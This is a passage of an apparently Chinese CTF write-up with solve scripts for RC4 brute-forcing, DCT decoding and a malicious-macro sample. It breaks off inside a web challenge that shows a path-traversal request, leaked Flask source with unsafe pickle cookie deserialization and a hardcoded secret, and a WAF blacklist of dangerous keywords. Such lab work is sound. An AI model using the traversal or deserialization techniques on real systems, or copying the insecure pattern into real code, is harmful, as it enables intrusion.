class="hljs-keyword">raise</span> Exception(<span class="hljs-string">&quot;data Type Error&quot;</span>)<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">GetKey</span>(<span class="hljs-params">self,data</span>):<br>        k=[]<br>        k1=[]<br>        data_l=<span class="hljs-built_in">len</span>(data)<br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">256</span>):<br>            k.append(i)<br>            a=<span class="hljs-string">&quot;adsf&quot;</span><br><br>            k1.append(data[i%data_l])<br>        n=<span class="hljs-number">0</span><br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">256</span>):<br>            n=(k1[i]+n+k[i])&amp;<span class="hljs-number">0xff</span><br>            n1=k[i]<br>            k[i]=k[n]<br>            k[n]=n1<br>        <span class="hljs-keyword">return</span> k<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">Cipher</span>(<span class="hljs-params">self,data</span>):<br>        data=self.toBytes(data)<br>        enc=[]<br>        k=self.Key.copy()<br>        n=<span class="hljs-number">0</span><br>        n1=<span class="hljs-number">0</span><br>        tmp=<span class="hljs-number">0</span><br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(data)):<br>            n=(n+<span class="hljs-number">1</span>)&amp;<span class="hljs-number">0xff</span><br>            n1=(n1+k[n])&amp;<span class="hljs-number">0xff</span><br>            tmp=k[n]<br>            k[n]=k[n1]<br>            k[n1]=tmp<br>            enc.append(data[i]^<span class="hljs-number">0x11</span>^k[(k[n]+k[n1])%<span class="hljs-number">256</span>])<br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">bytes</span>(enc)<br><br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self,key</span>):<br>        key=self.toBytes(key)<br>        self.Key=self.GetKey(key)<br>        self.__Key=key<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">SetKey</span>(<span class="hljs-params">self,key</span>):<br>        key=self.toBytes(key)<br>        self.Key=self.GetKey(key)<br>        self.__Key=key<br><br>base_=<span class="hljs-string">b&quot;0123456789abcdef&quot;</span><br>data=[<span class="hljs-number">0x85</span>,<span class="hljs-number">0x43</span>,<span class="hljs-number">0x72</span>,<span class="hljs-number">0x78</span>,<span class="hljs-number">0x26</span>]<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> Gendic(base_,<span class="hljs-number">5</span>,<span class="hljs-literal">True</span>):<br>    e=[i[<span class="hljs-number">1</span>]^j <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> data]<br>    <span class="hljs-comment"># print(i)</span><br>    <span class="hljs-comment"># print(e)</span><br>    r=rc4(<span class="hljs-built_in">bytes</span>(i))<br>    d=r.Cipher(<span class="hljs-built_in">bytes</span>(e))<br>    <span class="hljs-keyword">if</span> d==<span class="hljs-string">b&#x27;\x89\x50\x4e\x47\x0d&#x27;</span>:<br>        <span class="hljs-built_in">print</span>(i)<br>        <span class="hljs-keyword">break</span><br></code></pre></td></tr></table></figure><p><img src="/img/wp/2024/2024-ycb-c-pic-1.png"></p><h2 id="你这主函数保真么"><a href="#你这主函数保真么" class="headerlink" title="你这主函数保真么"></a>你这主函数保真么</h2><p>离散余弦变换DCT，套模板代码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> numpy <span class="hljs-keyword">as</span> np<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">idct</span>(<span class="hljs-params">dct_data</span>):<br>    N = <span class="hljs-built_in">len</span>(dct_data)<br>    result = np.zeros(N)<br><br>    <span class="hljs-keyword">for</span> n <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(N):<br>        sum_value = <span class="hljs-number">0.0</span><br>        <span class="hljs-keyword">for</span> k <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(N):<br>            cos_term = np.cos((k * <span class="hljs-number">3.14159265</span> * (n + <span class="hljs-number">0.5</span>)) / N)<br>            <span class="hljs-keyword">if</span> k == <span class="hljs-number">0</span>:<br>                sum_value += dct_data[k] * np.sqrt(<span class="hljs-number">1.0</span> / N) * cos_term<br>            <span class="hljs-keyword">else</span>:<br>                sum_value += dct_data[k] * np.sqrt(<span class="hljs-number">2.0</span> / N) * cos_term<br>        result[n] = sum_value<br><br>    <span class="hljs-keyword">return</span> result<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">decrypt_to_ascii</span>(<span class="hljs-params">dct_data</span>):<br>    decrypted_data = idct(dct_data)<br>    int_data = np.rint(decrypted_data).astype(<span class="hljs-built_in">int</span>)<br>    char_data = [<span class="hljs-built_in">chr</span>(num) <span class="hljs-keyword">for</span> num <span class="hljs-keyword">in</span> int_data]<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;&#x27;</span>.join(char_data)<br><br>encrypted_data = [<span class="hljs-number">513.355</span>,<br>  -<span class="hljs-number">37.7986</span>,<br>  <span class="hljs-number">8.7316</span>,<br>  -<span class="hljs-number">10.7832</span>,<br>  -<span class="hljs-number">1.3097</span>,<br>  -<span class="hljs-number">20.5779</span>,<br>  <span class="hljs-number">6.98641</span>,<br>  -<span class="hljs-number">29.2989</span>,<br>  <span class="hljs-number">15.9422</span>,<br>  <span class="hljs-number">21.4138</span>,<br>  <span class="hljs-number">29.4754</span>,<br>  -<span class="hljs-number">2.77161</span>,<br>  -<span class="hljs-number">6.58794</span>,<br>  -<span class="hljs-number">4.22332</span>,<br>  -<span class="hljs-number">7.20771</span>,<br>  <span class="hljs-number">8.83506</span>,<br>  -<span class="hljs-number">4.38138</span>,<br>  -<span class="hljs-number">19.3898</span>,<br>  <span class="hljs-number">18.3453</span>,<br>  <span class="hljs-number">6.88259</span>,<br>  -<span class="hljs-number">14.7652</span>,<br>  <span class="hljs-number">14.6102</span>,<br>  <span class="hljs-number">24.7414</span>,<br>  -<span class="hljs-number">11.6222</span>,<br>  -<span class="hljs-number">9.754759999999999</span>,<br>  <span class="hljs-number">12.2424</span>,<br>  <span class="hljs-number">13.4343</span>,<br>  -<span class="hljs-number">34.9307</span>,<br>  -<span class="hljs-number">35.735</span>,<br>  -<span class="hljs-number">20.0848</span>,<br>  <span class="hljs-number">39.689</span>,<br>  <span class="hljs-number">21.879</span>,<br>  <span class="hljs-number">26.8296</span>]<br><br>decrypted_message = decrypt_to_ascii(encrypted_data)<br><br><span class="hljs-built_in">print</span>(decrypted_message)<br><span class="hljs-comment">#QNFPGS&#123;Ju0_1f_Zn1a_@aq_ShaaL_Qpg&#125;</span><br></code></pre></td></tr></table></figure><p>在进行一次rot13</p><p><code>DASCTF&#123;Wh0_1s_Ma1n_@nd_FunnY_Dct&#125;</code></p><h2 id="docCrack"><a href="#docCrack" class="headerlink" title="docCrack"></a>docCrack</h2><p>用微步云沙箱进行分析，可以看到 vba 宏代码，且释放了一个二进制文件</p><p><img src="/img/wp/2024/2024-ycb-c-docCrack-1.png"></p><p>通过样本提取把最后一个释放的 temp 文件进行提取，再进行 base64 解密后，就是一个二进制文件，且加密就一处</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">for</span> ( j = <span class="hljs-number">0</span>; j &lt; (<span class="hljs-type">int</span>)j_strlen(argv[<span class="hljs-number">1</span>]) &amp;&amp; (<span class="hljs-type">unsigned</span> __int64)j &lt; <span class="hljs-number">0x36</span>; ++j )<br>      v10[j + <span class="hljs-number">64</span>] = argv[<span class="hljs-number">1</span>][j] &lt;&lt; <span class="hljs-number">6</span>;<br></code></pre></td></tr></table></figure><p>在 vba 宏代码处，还存在一个加密</p><figure class="highlight vb"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vb"><span class="hljs-keyword">For</span> i = <span class="hljs-number">1</span> <span class="hljs-keyword">To</span> Len(inflag) res = Chr(Asc(<span class="hljs-keyword">Mid</span>(inflag, i, <span class="hljs-number">1</span>)) <span class="hljs-built_in">Xor</span> <span class="hljs-number">7</span>) Result = Result<br></code></pre></td></tr></table></figure><p>直接提取密文解密</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><code class="hljs python">v10 = <span class="hljs-built_in">list</span>(<span class="hljs-built_in">range</span>(<span class="hljs-number">54</span>))<br>v10[<span class="hljs-number">0</span>] = <span class="hljs-number">4288</span>;<br>v10[<span class="hljs-number">1</span>] = <span class="hljs-number">4480</span>;<br>v10[<span class="hljs-number">2</span>] = <span class="hljs-number">5376</span>;<br>v10[<span class="hljs-number">3</span>] = <span class="hljs-number">4352</span>;<br>v10[<span class="hljs-number">4</span>] = <span class="hljs-number">5312</span>;<br>v10[<span class="hljs-number">5</span>] = <span class="hljs-number">4160</span>;<br>v10[<span class="hljs-number">6</span>] = <span class="hljs-number">7936</span>;<br>v10[<span class="hljs-number">7</span>] = <span class="hljs-number">5184</span>;<br>v10[<span class="hljs-number">8</span>] = <span class="hljs-number">6464</span>;<br>v10[<span class="hljs-number">9</span>] = <span class="hljs-number">6528</span>;<br>v10[<span class="hljs-number">10</span>] = <span class="hljs-number">5632</span>;<br>v10[<span class="hljs-number">11</span>] = <span class="hljs-number">3456</span>;<br>v10[<span class="hljs-number">12</span>] = <span class="hljs-number">7424</span>;<br>v10[<span class="hljs-number">13</span>] = <span class="hljs-number">5632</span>;<br>v10[<span class="hljs-number">14</span>] = <span class="hljs-number">6336</span>;<br>v10[<span class="hljs-number">15</span>] = <span class="hljs-number">6528</span>;<br>v10[<span class="hljs-number">16</span>] = <span class="hljs-number">6720</span>;<br>v10[<span class="hljs-number">17</span>] = <span class="hljs-number">6144</span>;<br>v10[<span class="hljs-number">18</span>] = <span class="hljs-number">6272</span>;<br>v10[<span class="hljs-number">19</span>] = <span class="hljs-number">7488</span>;<br>v10[<span class="hljs-number">20</span>] = <span class="hljs-number">6656</span>;<br>v10[<span class="hljs-number">21</span>] = <span class="hljs-number">7296</span>;<br>v10[<span class="hljs-number">22</span>] = <span class="hljs-number">7424</span>;<br>v10[<span class="hljs-number">23</span>] = <span class="hljs-number">2432</span>;<br>v10[<span class="hljs-number">24</span>] = <span class="hljs-number">2432</span>;<br>v10[<span class="hljs-number">25</span>] = <span class="hljs-number">2432</span>;<br>v10[<span class="hljs-number">26</span>] = <span class="hljs-number">5632</span>;<br>v10[<span class="hljs-number">27</span>] = <span class="hljs-number">4416</span>;<br>v10[<span class="hljs-number">28</span>] = <span class="hljs-number">3456</span>;<br>v10[<span class="hljs-number">29</span>] = <span class="hljs-number">7168</span>;<br>v10[<span class="hljs-number">30</span>] = <span class="hljs-number">6528</span>;<br>v10[<span class="hljs-number">31</span>] = <span class="hljs-number">7488</span>;<br>v10[<span class="hljs-number">32</span>] = <span class="hljs-number">6272</span>;<br>v10[<span class="hljs-number">33</span>] = <span class="hljs-number">5632</span>;<br>v10[<span class="hljs-number">34</span>] = <span class="hljs-number">3520</span>;<br>v10[<span class="hljs-number">35</span>] = <span class="hljs-number">6208</span>;<br>v10[<span class="hljs-number">36</span>] = <span class="hljs-number">5632</span>;<br>v10[<span class="hljs-number">37</span>] = <span class="hljs-number">4736</span>;<br>v10[<span class="hljs-number">38</span>] = <span class="hljs-number">6528</span>;<br>v10[<span class="hljs-number">39</span>] = <span class="hljs-number">6400</span>;<br>v10[<span class="hljs-number">40</span>] = <span class="hljs-number">7488</span>;<br>v10[<span class="hljs-number">41</span>] = <span class="hljs-number">3520</span>;<br>v10[<span class="hljs-number">42</span>] = <span class="hljs-number">5632</span>;<br>v10[<span class="hljs-number">43</span>] = <span class="hljs-number">5184</span>;<br>v10[<span class="hljs-number">44</span>] = <span class="hljs-number">3456</span>;<br>v10[<span class="hljs-number">45</span>] = <span class="hljs-number">7488</span>;<br>v10[<span class="hljs-number">46</span>] = <span class="hljs-number">7296</span>;<br>v10[<span class="hljs-number">47</span>] = <span class="hljs-number">3200</span>;<br>v10[<span class="hljs-number">48</span>] = <span class="hljs-number">6272</span>;<br>v10[<span class="hljs-number">49</span>] = <span class="hljs-number">0x1D00</span>;<br>v10[<span class="hljs-number">50</span>] = <span class="hljs-number">0x980</span>;<br>v10[<span class="hljs-number">51</span>] = <span class="hljs-number">0x980</span>;<br>v10[<span class="hljs-number">52</span>] = <span class="hljs-number">0x980</span>;<br>v10[<span class="hljs-number">53</span>] = <span class="hljs-number">0x1E80</span>;<br><br><span class="hljs-keyword">for</span> i,v <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(v10):<br>    value=v;<br>    value = <span class="hljs-built_in">chr</span>((value &gt;&gt; <span class="hljs-number">6</span>)^<span class="hljs-number">7</span>)<br>    <span class="hljs-built_in">print</span>(value, end=<span class="hljs-string">&#x27;&#x27;</span>)<br></code></pre></td></tr></table></figure><p><code>DASCTF&#123;Vba_1s_dangerous!!!_B1ware_0f_Macr0_V1ru5es!!!&#125;</code></p><h1 id="初赛-web"><a href="#初赛-web" class="headerlink" title="[初赛] web"></a>[初赛] web</h1><h2 id="Lyrics-For-You"><a href="#Lyrics-For-You" class="headerlink" title="Lyrics For You"></a>Lyrics For You</h2><p><code>lyrics?lyrics=../app.py</code></p><p>任意文件读取得到源码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">import</span> random<br><br><span class="hljs-keyword">from</span> config.secret_key <span class="hljs-keyword">import</span> secret_code<br><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask, make_response, request, render_template<br><span class="hljs-keyword">from</span> cookie <span class="hljs-keyword">import</span> set_cookie, cookie_check, get_cookie<br><span class="hljs-keyword">import</span> pickle<br><br>app = Flask(__name__)<br>app.secret_key = random.randbytes(<span class="hljs-number">16</span>)<br><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">UserData</span>:<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, username</span>):<br>        self.username = username<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">Waf</span>(<span class="hljs-params">data</span>):<br>    blacklist = [<span class="hljs-string">b&#x27;R&#x27;</span>, <span class="hljs-string">b&#x27;secret&#x27;</span>, <span class="hljs-string">b&#x27;eval&#x27;</span>, <span class="hljs-string">b&#x27;file&#x27;</span>, <span class="hljs-string">b&#x27;compile&#x27;</span>, <span class="hljs-string">b&#x27;open&#x27;</span>, <span class="hljs-string">b&#x27;os.popen&#x27;</span>]<br>    valid = <span class="hljs-literal">False</span><br>    <span class="hljs-keyword">for</span> word <span class="hljs-keyword">in</span> blacklist:<br>        <span class="hljs-keyword">if</span> word.lower() <span class="hljs-keyword">in</span> data.lower():<br>            valid = <span class="hljs-literal">True</span><br>            <span class="hljs-keyword">break</span><br>    <span class="hljs-keyword">return</span> valid<br><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&quot;/&quot;</span>, methods=[<span class="hljs-string">&#x27;GET&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">index</span>():<br>    <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;index.html&#x27;</span>)<br><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&quot;/lyrics&quot;</span>, methods=[<span class="hljs-string">&#x27;GET&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">lyrics</span>():<br>    resp = make_response()<br>    resp.headers[<span class="hljs-string">&quot;Content-Type&quot;</span>] = <span class="hljs-string">&#x27;text/plain; charset=UTF-8&#x27;</span><br>    query = request.args.get(<span class="hljs-string">&quot;lyrics&quot;</span>)<br>    path = os.path.join(os.getcwd() + <span class="hljs-string">&quot;/lyrics&quot;</span>, query)<br><br>    <span class="hljs-keyword">try</span>:<br>        <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(path) <span class="hljs-keyword">as</span> f:<br>            res = f.read()<br>    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;No lyrics found&quot;</span><br>    <span class="hljs-keyword">return</span> res<br><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&quot;/login&quot;</span>, methods=[<span class="hljs-string">&#x27;POST&#x27;</span>, <span class="hljs-string">&#x27;GET&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">login</span>():<br>    <span class="hljs-keyword">if</span> request.method == <span class="hljs-string">&#x27;POST&#x27;</span>:<br>        username = request.form[<span class="hljs-string">&quot;username&quot;</span>]<br>        user = UserData(username)<br>        res = &#123;<span class="hljs-string">&quot;username&quot;</span>: user.username&#125;<br>        <span class="hljs-keyword">return</span> set_cookie(<span class="hljs-string">&quot;user&quot;</span>, res, secret=secret_code)<br>    <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;login.html&#x27;</span>)<br><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&quot;/board&quot;</span>, methods=[<span class="hljs-string">&#x27;GET&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">board</span>():<br>    invalid = cookie_check(<span class="hljs-string">&quot;user&quot;</span>, secret=secret_code)<br>    <span class="hljs-keyword">if</span> invalid:<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Nope, invalid code get out!&quot;</span><br><br>    data = get_cookie(<span class="hljs-string">&quot;user&quot;</span>, secret=secret_code)<br><br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">isinstance</span>(data, <span class="hljs-built_in">bytes</span>):<br>        a = pickle.loads(data)<br>        data = <span class="hljs-built_in">str</span>(data, encoding=<span class="hljs-string">&quot;utf-8&quot;</span>)<br><br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;username&quot;</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> data:<br>        <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;user.html&#x27;</span>, name=<span class="hljs-string">&quot;guest&quot;</span>)<br>    <span class="hljs-keyword">if</span> data[<span class="hljs-string">&quot;username&quot;</span>] == <span class="hljs-string">&quot;admin&quot;</span>:<br>        <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;admin.html&#x27;</span>, name=data[<span class="hljs-string">&quot;username&quot;</span>])<br>    <span class="hljs-keyword">if</span> data[<span class="hljs-string">&quot;username&quot;</span>] != <span class="hljs-string">&quot;admin&quot;</span>:<br>        <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;user.html&#x27;</span>, name=data[<span class="hljs-string">&quot;username&quot;</span>])<br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    os.chdir(os.path.dirname(__file__))<br>    app.run(host=<span class="hljs-string">&quot;0.0.0.0&quot;</span>, port=<span class="hljs-number">8080</span>)<br></code></pre></td></tr></table></figure><p>导入了<code>config.secret_key</code>和<code>cookie</code>，通过任意文件读取再次拿到源码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">secret_code = <span class="hljs-string">&quot;EnjoyThePlayTime123456&quot;</span><br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> base64<br><span class="hljs-keyword">import</span> hashlib<br><span class="hljs-keyword">import</span> hmac<br><span class="hljs-keyword">import</span> pickle<br><br><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> make_response, request<br><br>unicode = <span class="hljs-built_in">str</span><br>basestring = <span class="hljs-built_in">str</span><br><br><br><span class="hljs-comment"># Quoted from python bottle template, thanks :D</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">cookie_encode</span>(<span class="hljs-params">data, key</span>):<br>    msg = base64.b64encode(pickle.dumps(data, -<span class="hljs-number">1</span>))<br>    sig = base64.b64encode(hmac.new(tob(key), msg, digestmod=hashlib.md5).digest())<br>    <span class="hljs-keyword">return</span> tob(<span class="hljs-string">&#x27;!&#x27;</span>) + sig + tob(<span class="hljs-string">&#x27;?&#x27;</span>) + msg<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">cookie_decode</span>(<span class="hljs-params">data, key</span>):<br>    data = tob(data)<br>    <span class="hljs-keyword">if</span> cookie_is_encoded(data):<br>        sig, msg = data.split(tob(<span class="hljs-string">&#x27;?&#x27;</span>), <span class="hljs-number">1</span>)<br>        <span class="hljs-keyword">if</span> _lscmp(sig[<span class="hljs-number">1</span>:], base64.b64encode(hmac.new(tob(key), msg, digestmod=hashlib.md5).digest())):<br>            <span class="hljs-keyword">return</span> pickle.loads(base64.b64decode(msg))<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">waf</span>(<span class="hljs-params">data</span>):<br>    blacklist = [<span class="hljs-string">b&#x27;R&#x27;</span>, <span class="hljs-string">b&#x27;secret&#x27;</span>, <span class="hljs-string">b&#x27;eval&#x27;</span>, <span class="hljs-string">b&#x27;file&#x27;</span>, <span class="hljs-string">b&#x27;compile&#x27;</span>, <span class="hljs-string">b&#x27;open&#x27;</span>, <span class="hljs-string">b&#x27;os.popen&#x27;</span>]<br>    valid = <span class="hljs-literal">False</span><br>    <span class="hljs-keyword">for</span> word <span class="hljs-keyword">in</span> blacklist:<br>        <span class="hljs-keyword">if</span> word <span class="hljs-keyword">in</span> data:<br>            valid = <span class="hljs-literal">True</span><br>            <span class="hljs-comment"># print(word)</span><br>            <span class="hljs-keyword">break</span><br>    <span class="hljs-keyword">return</span> valid<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">cookie_check</span>(<span class="hljs-params">key, secret=<span class="hljs-literal">None</span></span>):<br>    a = request.cookies.get(key)<br>    data = tob(request.cookies.get(key))<br>    <span class="hljs-keyword">if</span> data:<br>        <span class="hljs-keyword">if</span> cookie_is_encoded(data):<br>            sig, msg = data.split(tob(<span class="hljs-string">&#x27;?&#x27;</span>), <span class="hljs-number">1</span>)<br>            <span class="hljs-keyword">if</span> _lscmp(sig[<span class="hljs-number">1</span>:], base64.b64encode(hmac.new(tob(secret), msg, digestmod=hashlib.md5).digest())):<br>                res = base64.b64decode(msg)<br>                <span class="hljs-keyword">if</span> waf(res):<br>                    <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br>                <span class="hljs-keyword">else</span>:<br>                    <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">tob</span>(<span class="hljs-params">s, enc=<span class="hljs-string">&#x27;utf8&#x27;</span></span>):<br>    <span class="hljs-keyword">return</span> s.encode(enc) <span class="hljs-keyword">if</span> <span 